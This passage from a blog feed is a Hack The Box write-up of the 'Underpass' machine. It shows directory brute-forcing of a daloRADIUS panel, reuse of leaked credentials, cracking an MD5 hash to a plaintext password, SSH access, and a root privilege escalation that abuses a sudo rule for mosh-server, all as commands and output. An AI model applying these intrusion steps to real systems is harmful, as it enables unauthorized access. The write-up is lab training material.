class="line"></span><br><span class="line"> Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544</span><br><span class="line"></span><br><span class="line">  Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app__24-12-25_14-54-26.txt</span><br><span class="line"></span><br><span class="line"> Target: http://Underpass.htb/</span><br><span class="line"></span><br><span class="line"> [14:54:26] Starting: daloradius/app/</span><br><span class="line"> [14:54:27] 301 -  330B  - /daloradius/app/common  -&gt;  http://underpass.htb/daloradius/app/common/</span><br><span class="line"> [14:54:27] 301 -  329B  - /daloradius/app/users  -&gt;  http://underpass.htb/daloradius/app/users/</span><br><span class="line"> [14:55:10] 301 -  333B  - /daloradius/app/operators  -&gt;  http://underpass.htb/daloradius/app/operators/</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>i went to &#x2F;app&#x2F;operators and i tried to access it with the last<br>Username:Password we had and its works we went to management and<br>list users and we find a hashed password so lets try to decode it<br>with crackstation or u can use john the ripper.<br>(type:MD5) 412DD4759978ACFCC81DEAB01B382403:underwaterfriends and lets try<br>to ssh with the username:password we got (btw : the username is svcMosh) </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ssh svcMosh@10.10.11.48</span><br><span class="line"><span class="comment"># and enter the password : underwaterfriends</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>IT WORKS, now we are inside the target machine<br>so u can read the user.flag </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">60a620dd37a894c9b.... <span class="comment"># U got this mate </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~$ <span class="built_in">sudo</span> -l</span><br><span class="line"> Matching Defaults entries <span class="keyword">for</span> svcMosh on localhost:</span><br><span class="line">   env_reset, mail_badpass,</span><br><span class="line">   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line"> User svcMosh may run the following commands on localhost:</span><br><span class="line">   (ALL) NOPASSWD: /usr/bin/mosh-server</span><br></pre></td></tr></table></figure><p>after some searching on google or u can read its manual </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~<span class="variable">$mosh</span></span><br><span class="line">Usage: /usr/bin/mosh [options] [--] [user@]host [<span class="built_in">command</span>...]</span><br><span class="line">      --client=PATH        mosh client on <span class="built_in">local</span> machine</span><br><span class="line">                              (default: <span class="string">&quot;mosh-client&quot;</span>)</span><br><span class="line">      --server=COMMAND     mosh server on remote machine <span class="comment"># interesting </span></span><br><span class="line">                              (default: <span class="string">&quot;mosh-server&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>And we are the root , we can read the root file and get this done </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">svcMosh@underpass:~$ mosh --server=<span class="string">&quot;sudo /usr/bin/mosh-server&quot;</span> localhost</span><br><span class="line"></span><br><span class="line">root@underpass:~# <span class="built_in">cat</span> /root/root.txt <span class="comment">#we are the root </span></span><br><span class="line"> 882f2654c3c9... <span class="comment">#try to find it </span></span><br></pre></td></tr></table></figure><pre><code>                          CONGRATULATION </code></pre><p>Summary :</p><p>for me , its my first time scanning UDP ports , and enumerate SNMP  so it was<br>a good experience. we learn that we need to brute force some directories<br>more and more until we find something that lead us to the target .<br>Also for the Privesca , it was good to learn about “mosh” command<br>and what used for and a Misconfiguration can lead to a root privileges.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Hello, today we gonna try to hack the Underpass machine  on hackthebox&lt;br&gt;the first thing is enumerate and see if there is an open port o</summary>
      
    
    
    
    <category term="ACTIVE MACHINE" scheme="http://0xdezznutz.github.io/categories/ACTIVE-MACHINE/"/>
    
    <category term="HACK THE BOX" scheme="http://0xdezznutz.github.io/categories/ACTIVE-MACHINE/HACK-THE-BOX/"/>
    
    <category term="LINUX" scheme="http://0xdezznutz.github.io/categories/ACTIVE-MACHINE/HACK-THE-BOX/LINUX/"/>
    
    
  </entry>
  
</feed>
